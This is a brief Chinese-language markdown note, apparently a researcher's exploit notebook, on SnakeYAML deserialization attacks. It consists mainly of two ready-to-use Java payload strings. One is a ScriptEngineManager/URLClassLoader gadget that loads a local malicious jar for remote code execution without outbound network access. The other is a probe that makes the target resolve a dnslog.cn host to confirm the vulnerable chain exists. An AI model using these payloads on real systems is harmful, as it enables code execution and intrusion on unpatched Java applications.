# snakeyaml

## 不出网利用
>通过fastjson写文件如何本地加载rce


https://xz.aliyun.com/t/10655

加载本地
```java
String data2 = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"file:E:/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
```

## 判断存在链

```java

poc = "key: [!!java.lang.String []: 0, !!java.net.URL [null, \"http://5ydl3f.dnslog.cn​\"]: 1]";

```
